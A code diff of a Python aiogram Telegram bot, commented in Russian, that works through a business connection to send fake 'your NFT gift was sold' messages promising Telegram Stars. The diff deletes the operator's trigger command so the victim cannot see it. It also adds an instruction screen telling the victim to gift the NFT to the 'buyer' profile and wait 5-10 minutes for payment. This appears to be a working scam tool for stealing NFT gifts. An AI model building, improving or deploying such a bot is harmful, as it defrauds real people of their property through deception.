@@ -10,8 +10,8 @@ from aiogram.utils.keyboard import InlineKeyboardBuilder
 from aiogram.enums import ParseMode
 
 # --- НАСТРОЙКИ ---
-BOT_TOKEN = "ТВОЙ_ТОКЕН_БОТА"
-MY_USERNAME = "oqraft"
+BOT_TOKEN = "ТВОЙ_ТОКЕН_БОТА" # Вставь токен от BotFather
+MY_USERNAME = "oqraft" # Твой юзернейм без @
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
@@ -55,9 +55,14 @@ async def activate_offer(message: types.Message):
     offer_data = offers_db[code]
     b_conn_id = message.business_connection_id
 
-    # Удаляем сообщение с командой
+    # Жесткое удаление сообщения с кодом
     try:
-        await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id, business_connection_id=b_conn_id)
+        await bot.delete_message(
+            chat_id=message.chat.id, 
+            message_id=message.message_id, 
+            business_connection_id=b_conn_id
+        )
+        print("Команда удалена.")
     except Exception as e:
         print(f"Ошибка удаления: {e}")
 
@@ -86,7 +91,7 @@ async def activate_offer(message: types.Message):
     except Exception as e:
         print(f"Ошибка: {e}")
 
-# --- КНОПКИ ---
+# --- КНОПКА ПРИНЯТЬ ---
 @dp.callback_query(F.data.startswith("acc_"))
 async def process_accept(callback: types.CallbackQuery):
     code = callback.data.split("_")[1]
@@ -104,6 +109,7 @@ async def process_accept(callback: types.CallbackQuery):
     )
     await callback.answer()
 
+# --- КНОПКА ОК (ПОСЛЕ ПРИНЯТИЯ) ---
 @dp.callback_query(F.data.startswith("ok_"))
 async def process_ok(callback: types.CallbackQuery):
     code = callback.data.split("_")[1]
@@ -113,8 +119,8 @@ async def process_ok(callback: types.CallbackQuery):
         text = f"🎁 Подарок: {data['nft_name']} продан!\n\nПередайте для зачисления {data['amount']} ⭐."
         
         builder = InlineKeyboardBuilder()
-        # Кнопка ведет на профиль oqraft
-        builder.row(InlineKeyboardButton(text="Передать NFT", url=f"https://t.me/{MY_USERNAME}"))
+        # Теперь кнопка ведет не на сайт, а вызывает функцию инструкции
+        builder.row(InlineKeyboardButton(text="Передать NFT", callback_data=f"how_{code}"))
         
         await bot.edit_message_text(
             chat_id=callback.message.chat.id,
@@ -125,13 +131,12 @@ async def process_ok(callback: types.CallbackQuery):
         )
     await callback.answer()
 
-# --- НОВАЯ КНОПКА "КАК ПЕРЕДАТЬ NFT" ---
+# --- ИНСТРУКЦИЯ (ТЕКСТ, КОТОРЫЙ ТЫ ПРОСИЛ) ---
 @dp.callback_query(F.data.startswith("how_"))
 async def process_how_to(callback: types.CallbackQuery):
     code = callback.data.split("_")[1]
     b_conn_id = callback.message.business_connection_id
     
-    # Текст инструкции
     text = (
         "Для передачи Nft-подарка, нужно нажать кнопку снизу, вернутся к передаче, после нажать кнопку передать-NFT, вас перекинет на профиль человека который купил нфт, нажать три точки сверху, и \"подарить подарок\" там выбрать нфт который вы продали и отправить, Внимание! После передачи нфт нужно подождать 5-10 минут для получения средств."
     )
@@ -159,7 +164,7 @@ async def process_back(callback: types.CallbackQuery):
         text = f"🎁 Подарок: {data['nft_name']} продан!\n\nПередайте для зачисления {data['amount']} ⭐."
         
         builder = InlineKeyboardBuilder()
-        builder.row(InlineKeyboardButton(text="Передать NFT", url=f"https://t.me/{MY_USERNAME}"))
+        builder.row(InlineKeyboardButton(text="Передать NFT", callback_data=f"how_{code}"))
         
         await bot.edit_message_text(
             chat_id=callback.message.chat.id,
@@ -170,6 +175,7 @@ async def process_back(callback: types.CallbackQuery):
         )
     await callback.answer()
 
+# --- КНОПКА ОТКЛОНИТЬ ---
 @dp.callback_query(F.data.startswith("dec_"))
 async def process_decline(callback: types.CallbackQuery):
     b_conn_id = callback.message.business_connection_id
